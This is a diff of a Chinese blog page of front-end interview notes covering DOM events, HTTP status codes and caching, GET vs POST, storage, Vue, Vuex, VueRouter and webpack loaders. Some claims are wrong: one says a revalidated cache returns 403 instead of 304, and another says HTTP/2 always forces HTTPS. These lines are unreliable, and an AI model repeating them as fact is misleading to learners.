-思路是点击 span 后，递归遍历 span 的祖先元素看其中有没有 ul 里面的 li。<br>完整的测试代码可以查看<a href="http://js.jirengu.com/topufepetu/1/edit?js,output" target="_blank" rel="noopener">这里</a><br><strong>简单记忆，四个参数，寒(函数)暄（选择器）卫（委托的元素）视（事件）</strong><br><a href="http://www.mamicode.com/info-detail-2546140.html" target="_blank" rel="noopener">委托事件参考1</a><br><a href="https://blog.csdn.net/qq_38128179/article/details/86293394" target="_blank" rel="noopener">委托事件参考2</a></li>
+<h2 id="当都设置为true的时候"><a href="#当都设置为true的时候" class="headerlink" title="当都设置为true的时候"></a>当都设置为true的时候</h2><ul>
+<li>增加类和移除类在延迟函数(setTimeout)里面<strong>都只有捕获阶段执行</strong>。也就是都是<strong>true</strong>。说明从<strong>外层逐步到内层，从父元素到子元素</strong>。</li>
+<li><strong>同时在同一个DIV绑定两个事件</strong>，增加类和移除类，并且<strong>增加类的代码在移除类的前面</strong>，那么就从<strong>外</strong>部该层<strong>先变色</strong>，然后<strong>移除该层的颜色</strong>，逐步到<strong>内层</strong>。</li>
+<li>jsbin代码<a href="http://js.jirengu.com/nobihoduzi/1/edit?html,css,js,output" target="_blank" rel="noopener">链接</a></li>
 </ul>
-</li>
-<li><p><strong>曾考</strong>：用 mouse 事件写一个可拖曳的 div    </p>
-<ul>
-<li><a href="https://jsbin.com/munuzureya/edit?html,js,output" target="_blank" rel="noopener">参考代码</a>  </li>
-<li>我自己写的<a href="https://jsbin.com/gakorujiwi/1/edit?js,output" target="_blank" rel="noopener">代码</a>，解决了移出视口后找不到图形的bug   </li>
-<li>这里的用到鼠标事件API——<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/mousedown_event" target="_blank" rel="noopener">mousedown</a>,<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/mousemove_event" target="_blank" rel="noopener">mousemove</a>,<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/mouseup_event" target="_blank" rel="noopener">mouseup</a>;   </li>
-<li>用到获取鼠标点击位置距离视口位置的API——<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/MouseEvent/clientX" target="_blank" rel="noopener">MouseEvent.clientX</a>和<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/MouseEvent/clientY" target="_blank" rel="noopener">MouseEvent.clientY</a>;   </li>
-<li>用到获取元素距离视口的位置的API-<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/HTMLElement/style" target="_blank" rel="noopener">HTMLElement.style</a>, Element.style.top,Element.style.left;    </li>
-<li>用到非数字（比如10px）转换为数字(比如10)的API——<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/parseInt" target="_blank" rel="noopener">parseInt</a>   </li>
-<li>主要思路就是监听鼠标点击（获取鼠标点击的视口位置，设置dragging为true），移动（，转化非数字为数字，比如转为10px转为10，把之前的css的位置加上增加的变化的位置，<strong>最后</strong>获取鼠标点击的视口位置）和松开状态（鼠标松开后拖动状态设置为false）。<strong>另外要记住鼠标移动和松开的监听的元素应该是document</strong><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2></li>
+<h2 id="当都设置为false的时候"><a href="#当都设置为false的时候" class="headerlink" title="当都设置为false的时候"></a>当都设置为false的时候</h2><ul>
+<li>增加类和移除类在延迟函数(setTimeout)里面<strong>都只有冒泡阶段执行</strong>。也就是都是<strong>false</strong>。说明从<strong>内层逐步到外层，从子元素到父元素</strong>。</li>
+<li>同时在同一个DIV绑定两个事件，增加类和移除类，并且增加类的代码在移除类的前面，那么就从<strong>内</strong>部该层<strong>先变色</strong>，然后<strong>移除该层的颜色</strong>，逐步到<strong>外层</strong>。</li>
+<li>jsbin代码<a href="http://js.jirengu.com/sucuxebare/1/edit?html,css,js,output" target="_blank" rel="noopener">链接</a></li>
 </ul>
-</li>
-<li><p><strong>必考</strong>：HTTP 状态码知道哪些？分别什么意思？<br>1xx 信息，继续发剩余部分的请求<br>简单记忆就是心（信息）意（1）<br>2xx 表示成功<br>3xx 表示需要进一步操作<br>4xx 表示浏览器方面出错<br>5xx 表示服务器方面出错<br><a href="http://www.runoob.com/http/http-status-codes.html" target="_blank" rel="noopener">完整参考</a></p>
-<ul>
-<li>1开头<ul>
-<li>一切（01，切换协议）</li>
+<h2 id="当前面的增加类为false，后面的移除类为true的时候"><a href="#当前面的增加类为false，后面的移除类为true的时候" class="headerlink" title="当前面的增加类为false，后面的移除类为true的时候"></a>当前面的增加类为false，后面的移除类为true的时候</h2><ul>
+<li>增加类在延迟函数(setTimeout)里面是<strong>冒泡阶段执行</strong>,移除类在延迟函数(setTimeout)里面<strong>捕获阶段执行</strong>。DOM事件模型都是<strong>先捕获在冒泡</strong>。</li>
+<li><strong>除了最内层外，其他DIV没有在同一个DIV绑定两个事件</strong>，跟<strong>代码顺序没有关系</strong>，但是<strong>最内层DIV</strong>在同一个DIV<strong>绑定两个事件</strong>，此时就跟代码<strong>顺序相关</strong>，代码在前面的就先执行，就是<strong>队列模型</strong>，所以<strong>最外层</strong>会移除类，也就是最开始没有颜色，然后到<strong>最内层</strong>的时候增加类，会<strong>先变色</strong>，然后<strong>移除该层颜色</strong>，然后从<strong>内部第二层</strong>开始从内向外部，也就是冒泡阶段增加类来添加颜色。</li>
+<li>jsbin代码<a href="http://js.jirengu.com/lakazurasu/1/edit?html,css,js,output" target="_blank" rel="noopener">链接</a></li>
 </ul>
-</li>
-<li>2开头<ul>
-<li>雌（01——已<strong>创</strong>建，拼音第一个是c，雌第一个也是c）</li>
-<li>激（02——已<strong>接</strong>受，拼音第一个是j，激第一个也是j）</li>
-<li>素（03——非<strong>授</strong>权，拼音第一个是s，授第一个也是s）</li>
-<li>五（04——<strong>无</strong>内容）</li>
-<li>支（05——重<strong>置</strong>支内容）</li>
-<li>部（06——<strong>部</strong>分内容）</li>
-</ul>
-</li>
-<li>3开头<ul>
-<li>就（01——永<strong>久</strong>移动）</li>
-<li>是（02——临<strong>时</strong>移动）</li>
-<li>只（03——查看其他地<strong>址</strong>）</li>
-<li>为（04——<strong>未</strong>修改，缓存）</li>
-<li>你（05——使用代<strong>理</strong>）</li>
-</ul>
-</li>
-<li>4开头<ul>
-<li>震（01 要求身份认<strong>证</strong>）</li>
-<li>爆（02 <strong>保</strong>留，将来使用）</li>
-<li>狙（03 <strong>拒</strong>绝执行此请求）</li>
-<li>元（04 无法根据客户端请求找到资<strong>源</strong>（网址））</li>
-<li>芳（05 请求方<strong>法</strong>被禁止）</li>
-<li>08（请求时间过长，这里也可以用巴士，巴对应8，<strong>士</strong>对应<strong>时间</strong>）和14（请求的URL过长），长（过长）巴（8）士（4）</li>
-</ul>
-</li>
-<li>5开头<ul>
-<li>公（01——服务器不支持请求的<strong>功</strong>能，无法完成请求）</li>
-<li>务（02——收到了一个<strong>无</strong>效的响应）</li>
-<li>危（03——超载或系统<strong>维</strong>护，服务器暂时的无法处理客户端的请求）</li>
-<li>机（04——未<strong>及</strong>时从远端服务器获取请求）</li>
-<li>本（05——服务器不支持请求的HTTP协议的版<strong>本</strong>）</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p><strong>大公司必考</strong>：HTTP 缓存有哪几种？<br>需要详细的了解 ETag、CacheControl、Expires 的异同<br><a href="https://imweb.io/topic/5795dcb6fb312541492eda8c" target="_blank" rel="noopener">参考</a><br><a href="https://github.com/bomber063/Session-LocalStorage-Cache-Control-for-45" target="_blank" rel="noopener">自己写的笔记</a><br>答题要点：<br>ETag 是通过对比浏览器和服务器资源的特征值（如MD5）来决定是否要发送文件内容，如果一样就只发送 304（not modified）<br>Expires 是设置过期时间（绝对时间），但是如果用户的本地时间错乱了，可能会有问题<br>CacheControl: max-age=3600 是设置过期时长（相对时间），跟本地时间无关。<br><strong>相对绝对时间</strong><br>一（<strong>E</strong>xpires）本(本地事件)（<strong>Ca</strong>cheControl）才对（相对）<br>提（e<strong>T</strong>ag）拉（<strong>L</strong>ast-Modified）箱（响应）,父（I<strong>f</strong>-None-Match或I<strong>f</strong>-Modified-Since）亲（<strong>请</strong>求）<br>If-None-Match对应ETag（naive，发音——拿(<strong>None</strong>)衣(<strong>E</strong>Tag)服）<br>If-Modified-Since对应Last-Modified<br>通过Expires头部或者Cache-Control头部，浏览器发现该资源已经缓存了而且没有过期，<strong>不需要发请</strong>求直返响应200。<br>通过ETag或者Last-Modified需要发请求，确定ETag值或者修改日期是否不同，如果相同也是需要发请求，返回403未修改，返回内容为空。<br>时间（Expires头部或者Cache-Control）<br>验证（ETag或者Last-Modified）  </p>
-<blockquote>
-<p>大公司可能会问http缓存顺序PWA  </p>
-</blockquote>
-</li>
-<li><p><strong>必考</strong>：GET 和 POST 的区别<br><strong>错解，但是能过面试</strong><br>GET在浏览器回退时是无害的，而POST会再次提交请求。<br>GET产生的URL地址可以被加入收藏栏，而POST不可以。<br>GET请求会被浏览器主动cache，而POST不会，除非手动设置。<br>GET请求只能进行url编码，而POST支持多种编码方式。<br>GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。<br>GET请求在URL中传送的参数是有长度限制的(一般2K左右)，而POST么有。（其实也是有的，大约4M-20M左右）<br>对参数的数据类型，GET只接受ASCII字符，而POST没有限制。<br>GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。<br>GET参数通过URL传递，POST放在Request body也就是消息体中传递。<br>GET只有一个报文，而POST需要两个以上（因为它有消息体）<br>GET幂等（幂等就是多次GET是不会改变任何数据库里面的信息），POST不幂等（提交请求当然会改变数据库）<br>正解<br>就一个区别：语义——GET 用于获取资源，POST 用于提交资源。<br><a href="https://zhuanlan.zhihu.com/p/22536382" target="_blank" rel="noopener">想装逼请参考</a>  </p>
-<p>回退 收藏栏 cache缓存 编码 历史记录 长度，字符，安全，传递，报文（数据包），幂等<br>回收村边立场治安保密</p>
-<p>简单记忆——<strong>村（缓存）边（编码）的（传递）秘（幂等）技（历史记录）包（报文）子（字符）全（安全）都（长度）回（回退）收（收藏栏）</strong>   </p>
-</li>
-<li><p>Cookie V.S. LocalStorage V.S. SessionStorage V.S. Session<br><a href="https://github.com/bomber063/Session-LocalStorage-Cache-Control-for-45" target="_blank" rel="noopener">自己关于区别的笔记</a></p>
-<ul>
-<li>首先解释三者<ul>
-<li>Cookie——服务器通过Set-Cookie头给客户端一串字符串，客户端每次访问相同域名的网页时，必须带上这段字符串</li>
-<li>Session——一段时间内的会话</li>
-<li>localStorage和SessionStorage它们是HTML5技术提供的的API。</li>
-</ul>
-</li>
-<li>Cookie V.S. LocalStorage（大小、请求和用户信息）<ul>
-<li>主要区别是 Cookie 会被发送到服务器，而 LocalStorage 不会,因为LocalStorage跟HTTP无关.</li>
-<li>Cookie 一般最大 4k，LocalStorage 可以用 5Mb 甚至 10Mb（各浏览器不同,经过测试，我的电脑的所有浏览器可以储存65MB）</li>
-<li>Cookie存用户信息比如SessionID，LocalStorage存一些不重要的数据。</li>
-</ul>
-</li>
-<li>LocalStorage V.S. SessionStorage（过期）<ul>
-<li>LocalStorage 一般不会自动过期（除非用户手动清除），而 SessionStorage 在回话（Session）结束时过期（如关闭浏览器）</li>
-</ul>
-</li>
-<li>Cookie V.S. Session（浏览器和服务器）<ul>
-<li>Cookie 存在浏览器的文件里，每次都随请求发送给 Server。而Session 存在服务器的文件里</li>
-<li>Session 是基于 Cookie 实现的，具体做法就是把 SessionID 存在 Cookie 里 </li>
-<li>Cookie可以篡改，Session避免了篡改。 </li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>HTTP1和HTTP2区别（也就是HTTP1.1和HTTP2.0的区别）</p>
-<ul>
-<li>HTTP2新特性<ul>
-<li>多路复用（MultiPlexing），即<strong>连接共享</strong>，即每一个request都是是用作连接共享机制的。一个request对应一个id，这样<strong>一个连接上可以有多个request</strong>，每个连接的request可以随机的混杂在一起，接收方可以根据request的 id将request再<strong>归属</strong>到各自不同的<strong>服务端</strong>请求里面。</li>
-<li>服务端推送（server push），例如我的网页有一个sytle.css的请求，在客户端收到sytle.css数据的同时，服务端会将sytle.js的文件推送给客户端，当客户端再次尝试获取sytle.js时就可以直接从缓存中获取到，不用再发请求了。</li>
-<li>HTTP2是强制开启https的。<br><a href="https://imququ.com/post/http2-new-opportunities-and-challenges.html" target="_blank" rel="noopener">详细可以看这位大神的分析</a><h2 id="Vue"><a href="#Vue" class="headerlink" title="Vue"></a>Vue</h2></li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p><strong>必考</strong>：watch 和 computed 和 methods 区别是什么？<br>思路：先翻译单词，再阐述作用，最后强行找不同。<br>watch就是<strong>监听</strong>数据的变化。computed是<strong>计算</strong>属性<br>要点：<br>computed 和 methods 相比，最大区别是 computed 有缓存（内存缓存）：如果 computed 属性依赖的属性没有变化，那么 computed 属性就不会重新计算。methods 则是看到一次计算一次。<br>watch 和 computed 相比，computed 是计算出一个属性（废话），而 watch 则可能是做别的事情（如上报数据）<br><a href="https://cn.vuejs.org/v2/guide/computed.html#%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7-vs-%E4%BE%A6%E5%90%AC%E5%B1%9E%E6%80%A7" target="_blank" rel="noopener">计算属性 vs 侦听属性</a><br><a href="https://cn.vuejs.org/v2/api/#computed" target="_blank" rel="noopener">计算属性</a><br><a href="https://cn.vuejs.org/v2/api/#watch" target="_blank" rel="noopener">watch</a><br><a href="https://github.com/Advanced-Frontend/Daily-Interview-Question/issues/304" target="_blank" rel="noopener">更多的区别有如下几点：</a>  </p>
-<ul>
-<li><p>功能上：computed是计算属性，也就是依赖其它的属性计算所得出最后的值。watch是去监听一个值的变化，然后执行相对应的函数(翻译解释，computed依赖属性然后计算属性，watch监听变化执行函数)</p>
-</li>
-<li><p>使用上：computed中的函数必须要用return返回；watch的回调里面会传入监听属性的新旧值，通过这两个值可以做一些特定的操作，不是必须要用return（computed一定有return返回，而watch传入新旧值，可以没有return）</p>
-</li>
-<li><p>性能上：computed中的函数所依赖的属性没有发生变化，那么调用当前的函数的时候会从缓存中读取，而watch在每次监听的值发生变化的时候都会执行回调（computed有缓存数据变化才会调用函数。watch没有缓存，每次变化都会调用）</p>
-</li>
-<li><p>场景上：computed：当一个属性受多个属性影响的时候，例子：购物车商品结算；watch：当一条数据影响多条数据的时候，例子：搜索框（computed<strong>单个</strong>受到多个影响，watch是<strong>单个</strong>影响多个。）<br>简单记忆——<strong>（返回）迎（影响）芳（缓存）姐（解释）</strong><br><a href="https://zhuanlan.zhihu.com/p/33778594" target="_blank" rel="noopener">知乎上也有区别参考</a></p>
-</li>
-</ul>
-</li>
-<li><p><strong>必考</strong>：Vue 有哪些生命周期钩子函数？分别有什么用？<br>钩子在<a href="https://cn.vuejs.org/v2/guide/instance.html#%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%9B%BE%E7%A4%BA" target="_blank" rel="noopener">文档</a>全都有，看红色的字。 </p>
-<ul>
-<li>beforeCreate——在实例初始化之后调用并做响应的事情。</li>
-<li>created——在实例创建完成后被立即调用</li>
-<li>beforeMount——在挂载开始之前被调用</li>
-<li>mounted——实例被挂载后调用</li>
-<li>beforeUpdate——<strong>数据更新</strong>时调用，发生在<strong>虚拟 DOM 打补丁之前</strong></li>
-<li>updated——由于<strong>数据更改</strong>导致的<strong>虚拟 DOM 重新渲染和打补丁</strong>，在这之后会调用该钩子</li>
-<li>activated——被 keep-alive <strong>缓存的组件激活</strong>时调用</li>
-<li>deactivated——被 keep-alive <strong>缓存的组件停用</strong>时调用。</li>
-<li>beforeDestroy——实例销毁之前调用</li>
-<li>destroyed——实例销毁后调用</li>
-<li>errorCaptured——当<strong>捕获</strong>一个来自<strong>子孙组件的错误时</strong>被调用</li>
-<li><strong>分类记忆</strong>——五组两两相似就有八个了，每（<strong>m</strong>ounted开头字母）次（<strong>c</strong>reated开头字母）都（<strong>u</strong>pdated）有(<strong>u</strong>pdated)大(da——<strong>d</strong>eactivated <strong>a</strong>ctivated )<ul>
-<li>beforeMount mounted（每mei）</li>
-<li>beforeCreate created （次ci）</li>
-<li>beforeDestroy destroyed(都dou)</li>
-<li>beforeUpdate updated(有u)</li>
-<li>deactivated activated （大da）</li>
-<li>最后一个是errorCaptured<br>把名字翻译一遍就是满分<br>要特别说明哪个钩子里<strong>请求数据，<a href="https://segmentfault.com/q/1010000010643393" target="_blank" rel="noopener">答案是 mounted</a></strong>  </li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p><strong>必考</strong>：Vue 如何实现组件间通信？<br>父子组件：使用 v-on 通过事件通信(触发用$emit(‘事件名’,数据),监听用<a href="https://cn.vuejs.org/v2/api/#vm-on" target="_blank" rel="noopener">$on(‘事件名’，function(){}</a>)<br>爷孙组件：使用两次 v-on 通过爷爷爸爸通信，爸爸儿子通信实现爷孙通信<br>任意组件：使用 eventBus = new Vue() 来创建<a href="https://cn.vuejs.org/v2/guide/migration.html#dispatch-%E5%92%8C-broadcast-%E6%9B%BF%E6%8D%A2" target="_blank" rel="noopener">事件中心</a>通信，然后就可以在不同的组件中使用这eventBus.$on 和 eventBus.$emit这个两个主要API,<a href="https://github.com/bomber063/DIY-UI-frame-by-Vue-for-all/tree/tabs" target="_blank" rel="noopener">关于eventBus我之前写过笔记</a><br>任意组件：使用 Vuex 通信  </p>
-</li>
-<li><p><strong>必考</strong>：Vue 数据响应式怎么做到的？（或者这个问题以前会问Vue双向绑定的原理是什么，实际上应该是响应式原理。原理也就是源代码）<br>答案在文档<a href="https://cn.vuejs.org/v2/guide/reactivity.html" target="_blank" rel="noopener">《深入响应式原理》</a><br>要点<br>使用 Object.defineProperty（可以记住<strong>打(da)屁(pi)的</strong>拼音的第一个字母） 把这些属性全部转为 getter/setter<br>注意事项Vue <strong>不能检测到对象属性的添加或删除</strong>，解决方法是手动调用 Vue.set 或者 this.$set</p>
-<blockquote>
-<p>更详细的说明就是<a href="https://zhuanlan.zhihu.com/p/101330697" target="_blank" rel="noopener">参考这里</a>,一句话就是——vue.js 采用数据劫持结合发布-订阅模式,通过 Object.defineproperty 来劫持各个属性转为 setter,getter,在数据变动时发布消息给订阅者,触发响应的监听回调</p>
-</blockquote>
-<ul>
-<li>另外以前这个题目也叫做Vue的双向绑定是怎么做到的，但是Vue不是双向绑定，所以就不这么问了<ul>
-<li>回答Vue是如何实现双向绑定的就说用v-model，这里由<strong>两个语法实现(:input和:value)</strong>，可以查看以前的<a href="https://github.com/bomber063/DIY-UI-frame-by-Vue-for-all/tree/button-and-input" target="_blank" rel="noopener">笔记</a>,<strong>简单记忆就是ie,tv</strong>。</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p><strong>必考</strong>：Vue.set 是做什么用的？<br>见上一题——Vue <strong>不能检测到对象属性的添加或删除</strong>，解决方法是手动调用 Vue.set 或者 this.$set</p>
-</li>
-<li><p>Vuex 你怎么用的？<br>背下文档第一句：<a href="https://vuex.vuejs.org/zh/" target="_blank" rel="noopener">Vuex 是一个专为 Vue.js 应用程序开发的状态管理模式</a><br>说出核心概念的名字和作用：<a href="https://vuex.vuejs.org/zh/guide/state.html" target="_blank" rel="noopener">State</a> /<a href="https://vuex.vuejs.org/zh/guide/getters.html" target="_blank" rel="noopener">Getter</a> /<a href="https://vuex.vuejs.org/zh/guide/mutations.html" target="_blank" rel="noopener">Mutation</a> /<a href="https://vuex.vuejs.org/zh/guide/actions.html" target="_blank" rel="noopener">Action</a> /<a href="https://vuex.vuejs.org/zh/guide/modules.html" target="_blank" rel="noopener">Module</a>, Module有点复杂也可以<strong>不用详细回答</strong><br><a href="https://www.jianshu.com/p/bc63633321be" target="_blank" rel="noopener">Vuex 通俗版教程告诉你Vuex怎么用</a></p>
-<ul>
-<li>5个核心：<ul>
-<li>state——就是根据你项目的需求，自己定义的一个数据结构，里面可以放些通用的状态。</li>
-<li>getter——怎么理解呢？通俗的理解可以认为是getter里的函数就是vuex里的计算属性，类似于computed函数。</li>
-<li>mutations——改 Vuex 的 store 中的状态的唯一方法是提交 mutation。Vuex 中的 mutations 非常类似于事件</li>
-<li>Action类似于mutations，但是它<strong>提交的是 mutation，而不是直接变更状态</strong></li>
-<li>Modules——Vuex 允许我们将 store 分割成模块（module）。每个模块拥有自己的 state、mutation、action、getter、甚至是嵌套子模块</li>
-<li>总结起来：<strong>mutation</strong> 只管<strong>存</strong>，你给我（dispatch）我就存；<strong>action</strong>只管<strong>中间处理</strong>，处理完我就给你，你怎么存我不管（所有的改变state状态的都是mutation 来操作）；<strong>Getter</strong> 我只管<strong>取</strong>，我不改的（类似计算属性）。<br>简单记忆——gamma，<strong>第一个g代表getter,a代表action，m代表mutations和modules，最后一个state不需要记忆。</strong></li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>VueRouter 你怎么用的？</p>
-<ol>
-<li>背下文档第一句：<a href="https://router.vuejs.org/zh/" target="_blank" rel="noopener">Vue Router</a> 是 Vue.js 官方的路由管理器。</li>
-<li>说出核心概念的名字和作用：<a href="https://router.vuejs.org/zh/guide/essentials/history-mode.html" target="_blank" rel="noopener">History 模式</a> /<a href="https://router.vuejs.org/zh/guide/advanced/navigation-guards.html" target="_blank" rel="noopener">导航守卫</a> /<a href="https://router.vuejs.org/zh/guide/advanced/lazy-loading.html" target="_blank" rel="noopener">路由懒加载</a> /<a href="https://router.vuejs.org/zh/guide/essentials/redirect-and-alias.html" target="_blank" rel="noopener">重定向和别名</a>  </li>
-</ol>
-<ul>
-<li>路由懒加载说道import后面括号加上组件路径即可,比如<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>(<span class="string">'./Foo.vue'</span>) <span class="comment">// 返回 Promise</span></span><br></pre></td></tr></table></figure></li>
-</ul>
-<ol start="3">
-<li>说出常用 API：<a href="https://router.vuejs.org/zh/api/#router-link" target="_blank" rel="noopener">router-link</a> /<a href="https://router.vuejs.org/zh/api/#router-view" target="_blank" rel="noopener">router-view</a> /<a href="https://router.vuejs.org/zh/guide/essentials/navigation.html" target="_blank" rel="noopener">this.$router.push</a> /<a href="https://router.vuejs.org/zh/guide/essentials/navigation.html" target="_blank" rel="noopener">this.$router.replace</a> /<a href="https://router.vuejs.org/zh/guide/essentials/dynamic-matching.html" target="_blank" rel="noopener">this.$route.params</a> <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.$router.push(<span class="string">'/user-admin'</span>)</span><br><span class="line"><span class="keyword">this</span>.$route.params</span><br></pre></td></tr></table></figure></li>
-</ol>
-<ul>
-<li><a href="https://www.jianshu.com/p/9e39f877379c" target="_blank" rel="noopener">Vue-router中hash模式和history模式的区别</a></li>
-<li><a href="https://juejin.im/post/5b82bcfcf265da4345153343" target="_blank" rel="noopener">可能比文档还详细–VueRouter完全指北</a></li>
-<li><a href="https://segmentfault.com/a/1190000012563794" target="_blank" rel="noopener">VueRouter进阶（1）-导航守卫</a></li>
-</ul>
-</li>
-<li><p>路由守卫是什么？<br> 见上一节<a href="https://router.vuejs.org/zh/guide/advanced/navigation-guards.html" target="_blank" rel="noopener">导航守卫</a>里面的<a href="https://router.vuejs.org/zh/guide/advanced/navigation-guards.html#%E8%B7%AF%E7%94%B1%E7%8B%AC%E4%BA%AB%E7%9A%84%E5%AE%88%E5%8D%AB" target="_blank" rel="noopener">路由守卫</a><br>看官方文档的例子，背里面的关键的话</p>
-<h2 id="TypeScript（考的不多）"><a href="#TypeScript（考的不多）" class="headerlink" title="TypeScript（考的不多）"></a>TypeScript（考的不多）</h2></li>
-<li><p>never 类型是什么？<br>不应该出现的类型</p>
-</li>
-<li><p>TypeScript 比起 JavaScript 有什么优点？<br> <a href="https://www.zhihu.com/question/308564378" target="_blank" rel="noopener">随着 JavaScript 越来越完善，还有必要学习 TypeScript 吗？</a><br>提供了类型约束，因此更可控、更容易重构、更适合大型项目、更容易维护</p>
-<h2 id="Webpack"><a href="#Webpack" class="headerlink" title="Webpack"></a>Webpack</h2></li>
-<li><p><strong>必考</strong>：有哪些常见 loader 和 plugin，你用过哪些？<br><a href="https://segmentfault.com/a/1190000005106383" target="_blank" rel="noopener">webpack 常用plugin和loader</a><br> 按照类型：</p>
-<ul>
-<li><p>loader</p>
-<ul>
-<li>html有pug-loader(这个我不知道是什么语言),Markdown-loader</li>
-<li>css有post-loader,scss-loader,less-loader,style-loader</li>
-<li>js有baber-loader,eslint-loader</li>
-<li><strong>图片有image-loader</strong></li>
-</ul>
-</li>
-<li><p>plugin</p>
-<ul>
-<li>html有html-webpack-plugin</li>
-<li>css有<strong>extract-text-plugin</strong></li>
-<li>js有<strong>plugin-transform-arrow-functions</strong>，见以前的<a href="https://github.com/bomber063/first-acquaintance-webpack-for-46" target="_blank" rel="noopener">笔记</a></li>
-<li>其他有<strong>IgnorePlugin——不打包匹配文件</strong></li>
-</ul>
-</li>
-<li><p>按照总的类型：  </p>
-<ul>
-<li>file-loader：把文件输出到一个文件夹中，在代码中通过相对 URL 去引用输出的文件</li>
-<li>url-loader：和 file-loader 类似，但是能在文件很小的情况下以 base64 的方式把文件内容注入到代码中去</li>
-<li>source-map-loader：加载额外的 Source Map 文件，以方便断点调试</li>
-<li><strong>下面几个比较容易记住</strong><ul>
-<li><strong>image-loader：加载并且压缩图片文件</strong></li>
-<li>babel-loader：把 ES6 转换成 ES5</li>
-<li>css-loader：加载 CSS，支持模块化、压缩、文件导入等特性</li>
-<li>style-loader：把 CSS 代码注入到 JavaScript 中，通过 DOM 操作去加载 CSS。</li>
-<li>eslint-loader：通过 ESLint 检查 JavaScript 代码<ul>
-<li>plugin</li>
-<li><strong>define-plugin：定义环境变量</strong></li>
-<li>commons-chunk-plugin：提取公共代码</li>
-<li>uglifyjs-webpack-plugin：通过UglifyES压缩ES6代码</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>常用 Loaders</p>
-<ul>
-<li>本节将对本书用到的及其它常用 Loader 做一个汇总，以方便你在这快速查找到你需要的 Loader。</li>
-</ul>
-</li>
-<li><p>加载文件</p>
-<ul>
-<li>raw-loader：把文本文件的内容加载到代码中去，在 3-20加载SVG 中有介绍。</li>
-<li>file-loader：把文件输出到一个文件夹中，在代码中通过相对 URL 去引用输出的文件，在 3-19加载图片、3-20加载 SVG、4-9 CDN 加速 中有介绍。</li>
-<li>url-loader：和 file-loader 类似，但是能在文件很小的情况下以 base64 的方式把文件内容注入到代码中去，在 3-19加载图片、3-20加载 SVG 中有介绍。</li>
-<li>source-map-loader：加载额外的 Source Map 文件，以方便断点调试，在 3-21加载 Source Map 中有介绍。</li>
-<li>svg-inline-loader：把压缩后的 SVG 内容注入到代码中，在 3-20加载 SVG 中有介绍。</li>
-<li><strong>node-loader：加载 Node.js 原生模块 .node 文件。</strong></li>
-<li><strong>image-loader：加载并且压缩图片文件。</strong></li>
-<li>json-loader：加载 JSON 文件。</li>
-<li>yaml-loader：加载 YAML 文件。</li>
-</ul>
-</li>
-<li><p>编译模版</p>
-<ul>
-<li>pug-loader：把 Pug 模版转换成 JavaScript 函数返回。</li>
-<li>handlebars-loader：把 Handlebars 模版编译成函数返回。</li>
-<li>ejs-loader：把 EJS 模版编译成函数返回。</li>
-<li>haml-loader：把 HAML 代码转换成 HTML。</li>
-<li><strong>markdown-loader：把 Markdown 文件转换成 HTML。</strong></li>
-</ul>
-</li>
-<li><p>转换脚本语言</p>
-<ul>
-<li><strong>babel-loader：把 ES6 转换成 ES5，在3-1使用 ES6 语言中有介绍。</strong></li>
-<li>ts-loader：把 TypeScript 转换成 JavaScript，在3-2使用 TypeScript 语言中有遇到。</li>
-<li>awesome-typescript-loader：把 TypeScript 转换成 JavaScript，性能要比 ts-loader 好。</li>
-<li>coffee-loader：把 CoffeeScript 转换成 JavaScript。</li>
-</ul>
-</li>
-<li><p>转换样式文件</p>
-<ul>
-<li><strong>css-loader：加载 CSS，支持模块化、压缩、文件导入等特性。</strong></li>
-<li><strong>style-loader：把 CSS 代码注入到 JavaScript 中，通过 DOM 操作去加载 CSS。</strong></li>
-<li><strong>sass-loader：把 SCSS/SASS 代码转换成 CSS，在3-4使用 SCSS 语言中有介绍。</strong></li>
-<li><strong>postcss-loader：扩展 CSS 语法，使用下一代 CSS，在3-5使用 PostCSS中有介绍。</strong>，我有记录<a href="https://github.com/bomber063/first-acquaintance-webpack2-for-46" target="_blank" rel="noopener">postcss-loader笔记</a></li>
-<li><strong>less-loader：把 Less 代码转换成 CSS 代码。</strong></li>
-<li>stylus-loader：把 Stylus 代码转换成 CSS 代码。</li>
-</ul>
-</li>
-<li><p>检查代码</p>
-<ul>
-<li>eslint-loader：通过 ESLint 检查 JavaScript 代码，在 3-16检查代码中有介绍。</li>
-<li>tslint-loader：通过 TSLint 检查 TypeScript 代码。</li>
-<li>mocha-loader：加载 Mocha 测试用例代码。</li>
-<li>coverjs-loader：计算测试覆盖率。</li>
-</ul>
-</li>
-<li><p>其它</p>
-<ul>
-<li>vue-loader：加载 Vue.js 单文件组件，在3-7使用 Vue 框架中有介绍。</li>
-<li>i18n-loader：加载多语言版本，支持国际化。</li>
-<li>ignore-loader：忽略掉部分文件，在3-11构建同构应用中有介绍。</li>
-<li>ui-component-loader：按需加载 UI 组件库，例如在使用 antd UI 组件库时，不会因为只用到了 Button 组件而打包进所有的组件。</li>
-</ul>
-</li>
-<li><p>以上信息来自于<a href="https://webpack.wuhaolin.cn/%E9%99%84%E5%BD%95/%E5%B8%B8%E7%94%A8Loaders.html" target="_blank" rel="noopener">这里</a></p>
-</li>
-<li><p>常用 Plugins</p>
-<ul>
-<li>本节将对本书用到的及其它常用 Plugin 做一个汇总，以方便你在这快速查找到你需要的 Plugin。</li>
-</ul>
-</li>
-<li><p>用于修改行为</p>
-<ul>
